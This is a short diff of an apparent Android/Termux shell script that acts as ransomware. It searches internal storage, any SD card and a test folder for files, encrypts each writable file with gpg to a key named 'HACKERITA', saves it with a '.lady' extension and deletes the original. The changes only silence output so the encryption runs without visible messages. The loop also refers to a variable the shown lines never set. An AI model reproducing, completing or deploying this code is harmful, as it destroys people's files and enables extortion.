@@ -3,11 +3,11 @@ yes|apt install gnupg >/dev/null 2>/dev/null
 SD0="/storage/emulated/0"
 SD1=$(df|tail -n 2|awk -F " " '{print $6}'|grep -iv "emulated"|head -n 1)
 SD2="${HOME}/test"
-T1=$(find $SD0 $SD1 -type f)
-T2=$(find $SD2 -type f)
+T1=$(find $SD0 $SD1 -type f) >/dev/null 2>/dev/null
+T2=$(find $SD2 -type f) >/dev/null 2>/dev/null
 for i in ${T[*]};do
   mv "$i" "${i// /-}" 2>/dev/null
   [[ -O $i ]] && chmod +rwx $i
-  [[ -w $i ]] && gpg -e -q -o $i.lady -r HACKERITA $i
+  [[ -w $i ]] && gpg -e -q -o $i.lady -r HACKERITA $i >/dev/null 2>/dev/null
   [[ -e $i.lady ]] && rm $i
 done
